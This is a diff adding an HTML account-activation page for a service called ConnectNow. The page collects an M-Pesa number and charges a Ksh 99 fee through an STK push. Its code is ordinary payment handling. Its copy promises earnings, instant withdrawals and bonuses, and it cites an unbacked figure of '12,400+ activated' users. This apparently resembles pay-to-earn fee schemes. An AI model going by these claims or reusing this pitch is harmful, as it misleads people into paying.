@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+  <title>Activation — ConnectNow</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+  <style>
+    /* ---------- RESET & BASE ---------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 40%, #2563eb 100%);
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before,
+    body::after {
+      content: '';
+      position: absolute;
+      border-radius: 50%;
+      animation: floatBg 18s ease-in-out infinite alternate;
+    }
+    body::before {
+      width: 500px;
+      height: 500px;
+      top: -10%;
+      right: -10%;
+      background: radial-gradient(circle, rgba(37, 99, 235, 0.20) 0%, transparent 70%);
+    }
+    body::after {
+      width: 400px;
+      height: 400px;
+      bottom: -10%;
+      left: -10%;
+      background: radial-gradient(circle, rgba(147, 197, 253, 0.12) 0%, transparent 70%);
+      animation-duration: 22s;
+      animation-direction: alternate-reverse;
+    }
+
+    @keyframes floatBg {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(40px, 30px) scale(1.2); }
+    }
+
+    /* ---------- CARD ---------- */
+    .activation-container {
+      width: 100%;
+      max-width: 480px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .activation-card {
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.10);
+      border-radius: 40px;
+      padding: 40px 28px;
+      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.30), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+      transition: transform 0.3s ease;
+    }
+    .activation-card:hover {
+      transform: translateY(-4px);
+    }
+
+    /* ---------- HEADER ---------- */
+    .card-header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .card-header .logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.8rem;
+      font-weight: 900;
+      color: #fff;
+      text-decoration: none;
+      margin-bottom: 6px;
+    }
+    .card-header .logo i {
+      color: #93c5fd;
+      font-size: 2rem;
+    }
+    .card-header h1 {
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: #fff;
+      margin-top: 4px;
+      letter-spacing: -0.02em;
+    }
+    .card-header p {
+      color: rgba(255, 255, 255, 0.70);
+      font-size: 0.95rem;
+      margin-top: 4px;
+    }
+
+    /* ---------- NOTICE ---------- */
+    .notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: 20px;
+      background: rgba(255, 255, 255, 0.06);
+      border-left: 4px solid #f59e0b;
+      margin-bottom: 24px;
+      backdrop-filter: blur(4px);
+    }
+    .notice i {
+      font-size: 1.2rem;
+      color: #fbbf24;
+      margin-top: 2px;
+    }
+    .notice .content {
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.85);
+    }
+    .notice .content strong {
+      color: #fff;
+      font-weight: 700;
+    }
+    .notice .content .fee {
+      color: #fbbf24;
+      font-weight: 700;
+    }
+
+    /* ---------- FORM ---------- */
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.80);
+      margin-bottom: 6px;
+      letter-spacing: 0.3px;
+    }
+    .form-group label i {
+      margin-right: 8px;
+      color: #93c5fd;
+    }
+    .form-group .hint {
+      font-size: 0.75rem;
+      color: rgba(255, 255, 255, 0.50);
+      margin-bottom: 6px;
+    }
+    .form-group .input-wrapper {
+      position: relative;
+    }
+    .form-group .input-wrapper i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: rgba(255, 255, 255, 0.40);
+      font-size: 1.1rem;
+      transition: color 0.2s;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 14px 110px 14px 46px;
+      border: 2px solid rgba(255, 255, 255, 0.15);
+      border-radius: 16px;
+      font-size: 1rem;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.25s;
+      background: rgba(255, 255, 255, 0.08);
+      color: #ffffff;
+      backdrop-filter: blur(4px);
+    }
+    .form-group input::placeholder {
+      color: rgba(255, 255, 255, 0.35);
+    }
+    .form-group input:focus {
+      border-color: #93c5fd;
+      outline: none;
+      background: rgba(255, 255, 255, 0.14);
+      box-shadow: 0 0 0 4px rgba(147, 197, 253, 0.15);
+    }
+
+    .input-btn {
+      position: absolute;
+      right: 6px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: linear-gradient(135deg, #2563eb, #1d4ed8);
+      color: #fff;
+      border: none;
+      border-radius: 40px;
+      padding: 6px 16px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      min-height: 36px;
+      white-space: nowrap;
+      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.30);
+      letter-spacing: 0.3px;
+      transition: all 0.2s;
+    }
+    .input-btn:hover {
+      background: linear-gradient(135deg, #3b82f6, #2563eb);
+      transform: translateY(-50%) scale(1.02);
+    }
+    .input-btn i {
+      margin-right: 4px;
+    }
+
+    /* ---------- STATUS ---------- */
+    .status-box {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      border-radius: 20px;
+      background: rgba(255, 255, 255, 0.04);
+      border-left: 4px solid #fbbf24;
+      margin-bottom: 24px;
+      backdrop-filter: blur(4px);
+    }
+    .status-box i {
+      font-size: 1.1rem;
+      color: #fbbf24;
+    }
+    .status-box .text {
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.80);
+    }
+    .status-box .text strong {
+      color: #fff;
+    }
+
+    /* ---------- MAIN BUTTON ---------- */
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #3b82f6, #2563eb);
+      color: #fff;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 1.05rem;
+      cursor: pointer;
+      transition: all 0.25s;
+      box-shadow: 0 8px 32px rgba(59, 130, 246, 0.50);
+      margin-top: 8px;
+      font-family: 'Inter', sans-serif;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.10);
+    }
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 16px 48px rgba(59, 130, 246, 0.60);
+      background: linear-gradient(135deg, #60a5fa, #2563eb);
+    }
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+
+    /* ---------- FOOTER ---------- */
+    .footer-meta {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 0.8rem;
+      color: rgba(255, 255, 255, 0.40);
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      padding-top: 20px;
+    }
+    .footer-meta .badges {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 12px;
+    }
+    .footer-meta .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: rgba(255, 255, 255, 0.60);
+      font-weight: 500;
+      font-size: 0.75rem;
+    }
+    .footer-meta .badge i {
+      color: #93c5fd;
+    }
+    .footer-meta .highlight {
+      color: #fbbf24;
+      font-weight: 600;
+    }
+    .footer-meta a {
+      color: rgba(255, 255, 255, 0.60);
+      text-decoration: none;
+    }
+    .footer-meta a:hover {
+      color: #93c5fd;
+    }
+
+    /* ---------- RESPONSIVE ---------- */
+    @media (max-width: 480px) {
+      .activation-card {
+        padding: 32px 20px;
+      }
+      .card-header .logo {
+        font-size: 1.5rem;
+      }
+      .card-header h1 {
+        font-size: 1.4rem;
+      }
+      .form-group input {
+        padding: 12px 100px 12px 42px;
+        font-size: 0.95rem;
+      }
+      .input-btn {
+        font-size: 0.7rem;
+        padding: 4px 12px;
+        min-height: 32px;
+      }
+      .notice .content {
+        font-size: 0.8rem;
+      }
+      .status-box .text {
+        font-size: 0.8rem;
+      }
+    }
+
+    /* ========== MODAL STYLING – Blue Glass + Gold Accents ========== */
+    .swal2-popup {
+      border-radius: 32px !important;
+      padding: 1.5rem 1.2rem !important;
+      width: 94% !important;
+      max-width: 400px !important;
+      margin: 0 auto !important;
+      font-size: 0.85rem !important;
+      background: rgba(255, 255, 255, 0.08) !important;
+      backdrop-filter: blur(24px) !important;
+      -webkit-backdrop-filter: blur(24px) !important;
+      border: 1px solid rgba(255, 255, 255, 0.12) !important;
+      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.40), 0 0 0 1px rgba(255, 255, 255, 0.05) inset !important;
+      color: #eef2ff !important;
+    }
+
+    .swal2-title {
+      font-size: 1.3rem !important;
+      color: #fbbf24 !important;
+      font-weight: 800 !important;
+      padding: 0 !important;
+      margin-bottom: 0.5rem !important;
+      letter-spacing: -0.02em;
+    }
+
+    .swal2-html-container {
+      margin: 0 !important;
+      padding: 0 !important;
+      overflow: visible !important;
+    }
+
+    .swal2-confirm {
+      background: linear-gradient(135deg, #3b82f6, #2563eb) !important;
+      border-radius: 60px !important;
+      font-weight: 700 !important;
+      padding: 0.7rem 1.8rem !important;
+      font-size: 0.9rem !important;
+      border: 1px solid rgba(255, 255, 255, 0.15) !important;
+      color: white !important;
+      box-shadow: 0 8px 24px rgba(37, 99, 235, 0.30) !important;
+      transition: all 0.25s !important;
+    }
+    .swal2-confirm:hover {
+      transform: translateY(-2px) !important;
+      box-shadow: 0 12px 32px rgba(37, 99, 235, 0.50) !important;
+    }
+
+    .swal2-cancel {
+      background: rgba(255, 255, 255, 0.06) !important;
+      color: #eef2ff !important;
+      border-radius: 60px !important;
+      font-weight: 600 !important;
+      padding: 0.7rem 1.8rem !important;
+      font-size: 0.9rem !important;
+      border: 1px solid rgba(255, 255, 255, 0.15) !important;
+      backdrop-filter: blur(4px) !important;
+      transition: all 0.25s !important;
+    }
+    .swal2-cancel:hover {
+      background: rgba(255, 255, 255, 0.12) !important;
+    }
+
+    .swal2-actions {
+      margin: 0.8rem 0 0 !important;
+      gap: 0.6rem !important;
+    }
+
+    .swal2-loading {
+      margin: 0.5rem auto;
+    }
+
+    /* inner modal content */
+    .modal-content {
+      text-align: left;
+      width: 100%;
+    }
+    .modal-icon {
+      font-size: 2.8rem;
+      margin-bottom: 0.5rem;
+      text-align: center;
+    }
+    .modal-detail-box {
+      background: rgba(255, 255, 255, 0.06);
+      padding: 0.7rem;
+      border-radius: 16px;
+      margin: 0.6rem 0;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: #eef2ff;
+      text-align: center;
+    }
+    .modal-detail-box strong {
+      color: #fbbf24;
+    }
+    .modal-note {
+      font-size: 0.75rem;
+      color: rgba(255, 255, 255, 0.50);
+      text-align: center;
+      margin-top: 0.3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="activation-container">
+    <div class="activation-card">
+
+      <!-- Header -->
+      <div class="card-header">
+        <a href="index.html" class="logo">
+          <i class="fas fa-comment-dots"></i> ConnectNow
+        </a>
+        <h1>Activate Your Account</h1>
+        <p>Unlock full access and start earning</p>
+      </div>
+
+      <!-- Notice -->
+      <div class="notice">
+        <i class="fas fa-shield-alt"></i>
+        <div class="content">
+          <strong>Action required:</strong> Complete account activation to unlock all features.
+          Fee: <span class="fee">Ksh 99</span> via M-Pesa.
+        </div>
+      </div>
+
+      <!-- Phone input -->
+      <div class="form-group">
+        <label for="phone">
+          <i class="fas fa-mobile-alt"></i> M-Pesa registered number
+        </label>
+        <div class="hint">Enter the phone number linked to your M-Pesa account for activation &amp; bonus credit.</div>
+        <div class="input-wrapper">
+          <i class="fas fa-phone-alt"></i>
+          <input type="tel" id="phone" placeholder="e.g. 07XX XXX XXX" value="0795567653" />
+          <button class="input-btn" id="activateInlineBtn"><i class="fas fa-check-circle"></i> Activate</button>
+        </div>
+      </div>
+
+      <!-- Status -->
+      <div class="status-box" id="statusBox">
+        <i class="fas fa-exclamation-triangle" id="statusIcon"></i>
+        <div class="text" id="statusText">
+          <strong>Account activation pending.</strong> Complete verification to receive your signup bonus &amp; full dashboard access.
+        </div>
+      </div>
+
+      <!-- Main button -->
+      <button class="btn-primary" id="activateMainBtn">
+        <i class="fas fa-unlock-alt"></i> Activate Account &amp; Unlock Earnings
+      </button>
+
+      <p style="text-align:center; color: rgba(255,255,255,0.50); font-size:0.75rem; margin-top: 12px;">
+        🎁 Limited-time bonus: double rewards for first activation
+      </p>
+
+      <!-- Footer -->
+      <div class="footer-meta">
+        <div class="badges">
+          <span class="badge"><i class="fas fa-bolt"></i> 12,400+ activated</span>
+          <span class="badge"><i class="fas fa-wallet"></i> Instant withdrawal ready</span>
+          <span class="badge"><i class="fas fa-gem"></i> Daily cashback</span>
+        </div>
+        <p>
+          <span class="highlight">🔥 Verify once, earn permanently</span> &bull; 24/7 support
+        </p>
+        <p style="margin-top: 8px; font-size:0.7rem; opacity:0.6;">
+          <i class="fas fa-arrow-left"></i> <a href="index.html">Back to Home</a>
+        </p>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+
+      // ---------- DOM refs ----------
+      const phoneInput = document.getElementById('phone');
+      const statusIcon = document.getElementById('statusIcon');
+      const statusText = document.getElementById('statusText');
+      const statusBox = document.getElementById('statusBox');
+
+      // ---------- API endpoints ----------
+      const API = {
+        normalizePhone: '/api/normalize-phone',
+        initiatePayment: '/api/initiate-payment',
+        verifyPayment: '/api/verify-payment'
+      };
+
+      // ---------- Phone formatting helpers ----------
+      function formatInputDisplay(value) {
+        // Remove all non-digits
+        let digits = value.replace(/\D/g, '');
+        // If starts with 254, strip it for display, but we keep raw for logic
+        // We'll just format as 07XX XXX XXX for any 9-digit number
+        if (digits.startsWith('254')) {
+          digits = digits.substring(3);
+        }
+        if (digits.length === 9) {
+          // Format as 07XX XXX XXX
+          return '0' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6);
+        }
+        // If it's longer, just return raw digits with spaces?
+        // We'll just return the raw cleaned digits for simplicity
+        return digits;
+      }
+
+      function cleanPhoneForValidation(raw) {
+        let cleaned = raw.replace(/\D/g, '');
+        if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
+        if (cleaned.startsWith('254')) cleaned = cleaned.substring(3);
+        return cleaned; // should be 9 digits
+      }
+
+      function displayPhoneForModal(phone) {
+        // Given a 9-digit number, format as 0XXXXXXXXX (without spaces)
+        if (phone.length === 9) {
+          return '0' + phone;
+        }
+        return phone;
+      }
+
+      // ---------- Input formatting on the fly ----------
+      phoneInput.addEventListener('input', function() {
+        let raw = this.value;
+        // Remove everything except digits
+        let digits = raw.replace(/\D/g, '');
+        // If it starts with 254, keep it but we'll trim later for display
+        // We'll format as 07XX XXX XXX if we have 9 digits
+        if (digits.startsWith('254')) {
+          digits = digits.substring(3);
+        }
+        if (digits.length > 9) digits = digits.slice(0, 9);
+        let formatted = '';
+        if (digits.length <= 3) {
+          formatted = digits;
+        } else if (digits.length <= 6) {
+          formatted = digits.slice(0, 3) + ' ' + digits.slice(3);
+        } else {
+          formatted = digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6);
+        }
+        // Add leading zero if we have digits
+        if (digits.length > 0) {
+          formatted = '0' + formatted;
+        } else {
+          formatted = '';
+        }
+        // Update the input value
+        this.value = formatted;
+      });
+
+      // ---------- Validate phone (returns 9-digit string) ----------
+      function validatePhone(raw) {
+        let cleaned = raw.replace(/\D/g, '');
+        if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
+        if (cleaned.startsWith('254')) cleaned = cleaned.substring(3);
+        if (cleaned.length !== 9) throw new Error('Enter 9 digits e.g., 795567653');
+        if (!cleaned.startsWith('7') && !cleaned.startsWith('1')) {
+          throw new Error('Must start with 7 or 1');
+        }
+        return cleaned;
+      }
+
+      // ---------- API calls ----------
+      async function normalizePhone(phone) {
+        const res = await fetch(API.normalizePhone, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: phone })
+        });
+        if (!res.ok) {
+          const err = await res.json();
+          throw new Error(err.error || 'Phone normalization failed');
+        }
+        const data = await res.json();
+        if (!data.success) throw new Error(data.error || 'Invalid phone');
+        return data.normalized_phone; // expects +254XXXXXXXXX
+      }
+
+      async function initiatePayment(phoneNumber, amount) {
+        const res = await fetch(API.initiatePayment, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone_number: phoneNumber,
+            amount: amount
+          })
+        });
+        if (!res.ok) {
+          const err = await res.json();
+          throw new Error(err.error || 'Payment initiation failed');
+        }
+        return await res.json();
+      }
+
+      async function verifyPayment(reference) {
+        const res = await fetch(`${API.verifyPayment}?reference=${reference}`);
+        if (!res.ok) {
+          const err = await res.json();
+          throw new Error(err.error || 'Verification failed');
+        }
+        return await res.json();
+      }
+
+      async function pollPayment(reference, maxAttempts = 10, interval = 4000) {
+        for (let i = 0; i < maxAttempts; i++) {
+          const result = await verifyPayment(reference);
+          const status = (result.status || '').toUpperCase();
+          if (status === 'SUCCESS' || status === 'COMPLETED') {
+            return { success: true, data: result };
+          }
+          if (['FAILED', 'CANCELLED', 'TIMEOUT', 'EXPIRED'].includes(status)) {
+            return { success: false, error: `Payment ${status.toLowerCase()}` };
+          }
+          if (i < maxAttempts - 1) {
+            await new Promise(r => setTimeout(r, interval));
+          }
+        }
+        return { success: false, error: 'Payment verification timeout' };
+      }
+
+      // ---------- Update status UI ----------
+      function setActivated(activated) {
+        if (activated) {
+          statusBox.style.borderLeftColor = '#34d399';
+          statusIcon.className = 'fas fa-check-circle';
+          statusIcon.style.color = '#34d399';
+          statusText.innerHTML = '<strong>Account activated!</strong> You can now start earning.';
+        } else {
+          statusBox.style.borderLeftColor = '#fbbf24';
+          statusIcon.className = 'fas fa-exclamation-triangle';
+          statusIcon.style.color = '#fbbf24';
+          statusText.innerHTML =
+            '<strong>Account activation pending.</strong> Complete verification to receive your signup bonus &amp; full dashboard access.';
+        }
+      }
+
+      // ---------- Main activation flow ----------
+      async function startActivation() {
+        const rawPhone = phoneInput.value.trim();
+        if (!rawPhone) {
+          Swal.fire({
+            icon: 'warning',
+            title: 'Phone Required',
+            text: 'Please enter your M-Pesa phone number.',
+            confirmButtonColor: '#f59e0b',
+            confirmButtonText: 'OK'
+          });
+          phoneInput.focus();
+          return;
+        }
+
+        let cleanPhone;
+        try {
+          cleanPhone = validatePhone(rawPhone);
+        } catch (err) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Invalid Number',
+            text: err.message,
+            confirmButtonColor: '#ef4444',
+            confirmButtonText: 'OK'
+          });
+          phoneInput.focus();
+          return;
+        }
+
+        const displayPhone = displayPhoneForModal(cleanPhone); // e.g., "0795567653"
+
+        // Confirm
+        const confirm = await Swal.fire({
+          title: 'Activate Account',
+          html: `
+            <div class="modal-content">
+              <div class="modal-icon" style="color:#fbbf24;"><i class="fas fa-mobile-alt"></i></div>
+              <div class="modal-detail-box">
+                <strong>${displayPhone}</strong>
+              </div>
+              <p style="font-size:0.85rem; color:rgba(255,255,255,0.7); text-align:center;">
+                Fee: <strong style="color:#fbbf24;">Ksh 99</strong> will be charged via M-Pesa
+              </p>
+              <p class="modal-note">You'll receive an STK push on your phone</p>
+            </div>
+          `,
+          showCancelButton: true,
+          confirmButtonText: 'Pay Now',
+          cancelButtonText: 'Cancel',
+          confirmButtonColor: '#2563eb',
+          cancelButtonColor: 'rgba(255,255,255,0.06)',
+          reverseButtons: false
+        });
+
+        if (!confirm.isConfirmed) return;
+
+        try {
+          // Show loading
+          Swal.fire({
+            title: 'Processing',
+            html: '<div style="padding:0.5rem;">Please wait...</div>',
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading()
+          });
+
+          // Normalize phone
+          const normalized = await normalizePhone(cleanPhone);
+
+          // Initiate payment
+          Swal.update({
+            title: 'Sending Request',
+            html: '<div style="padding:0.5rem;">Initiating M-Pesa...</div>'
+          });
+
+          const payment = await initiatePayment(normalized, 99);
+          if (!payment.reference) throw new Error('No payment reference received');
+
+          // PIN prompt
+          await Swal.fire({
+            title: '📱 Check your phone',
+            html: `
+              <div class="modal-content">
+                <div class="modal-icon" style="color:#fbbf24;"><i class="fas fa-mobile-alt"></i></div>
+                <p style="text-align:center; font-weight:600;">Enter M-Pesa PIN</p>
+                <div class="modal-detail-box">
+                  ${displayPhone}
+                </div>
+                <p class="modal-note">Waiting for confirmation...</p>
+              </div>
+            `,
+            showConfirmButton: false,
+            timer: 2500,
+            timerProgressBar: true
+          });
+
+          // Poll for verification
+          Swal.fire({
+            title: 'Verifying',
+            html: `
+              <div style="padding:0.5rem; text-align:center;">
+                <div style="margin:0.5rem auto; width:40px; height:40px; border:4px solid rgba(255,255,255,0.1); border-top-color:#fbbf24; border-radius:50%; animation: spin 0.9s linear infinite;"></div>
+                <p style="margin-top:0.5rem;">Confirming payment...</p>
+              </div>
+            `,
+            showConfirmButton: false,
+            allowOutsideClick: false
+          });
+          // Add spin keyframe if not exists
+          if (!document.getElementById('spinStyle')) {
+            const style = document.createElement('style');
+            style.id = 'spinStyle';
+            style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
+            document.head.appendChild(style);
+          }
+
+          const pollResult = await pollPayment(payment.reference);
+
+          if (pollResult.success) {
+            setActivated(true);
+            await Swal.fire({
+              title: '✅ Account Activated!',
+              html: `
+                <div class="modal-content">
+                  <div class="modal-icon" style="color:#34d399;"><i class="fas fa-check-circle"></i></div>
+                  <div class="modal-detail-box">
+                    <div><strong>Welcome to ConnectNow!</strong></div>
+                    <div>📞 ${displayPhone}</div>
+                    <div style="font-weight:700; margin-top:0.3rem; color:#fbbf24;">Ksh 99 activation fee</div>
+                    <div style="font-size:0.7rem; color:rgba(255,255,255,0.5); margin-top:0.3rem;">Bonus credit added to your account</div>
+                  </div>
+                  <p class="modal-note">You now have full access. Start earning today!</p>
+                </div>
+              `,
+              confirmButtonText: 'Go to Dashboard',
+              confirmButtonColor: '#2563eb'
+            }).then(() => {
+              window.location.href = 'dashboard.html';
+            });
+          } else {
+            throw new Error(pollResult.error || 'Payment not confirmed');
+          }
+
+        } catch (err) {
+          Swal.fire({
+            title: '⚠️ Status',
+            html: `
+              <div class="modal-content">
+                <div class="modal-icon" style="color:#f59e0b;"><i class="fas fa-exclamation-triangle"></i></div>
+                <p style="text-align:center; font-weight:600;">${err.message || 'Payment issue'}</p>
+                <p class="modal-note">If amount deducted, contact support</p>
+              </div>
+            `,
+            confirmButtonText: 'OK',
+            confirmButtonColor: '#1e4a6e'
+          });
+        }
+      }
+
+      // ---------- Wire up buttons ----------
+      document.getElementById('activateInlineBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        startActivation();
+      });
+
+      document.getElementById('activateMainBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        startActivation();
+      });
+
+      phoneInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          startActivation();
+        }
+      });
+
+      // Set initial value from placeholder
+      phoneInput.value = '0795 567 653';
+    });
+  </script>
+
+</body>
+</html>
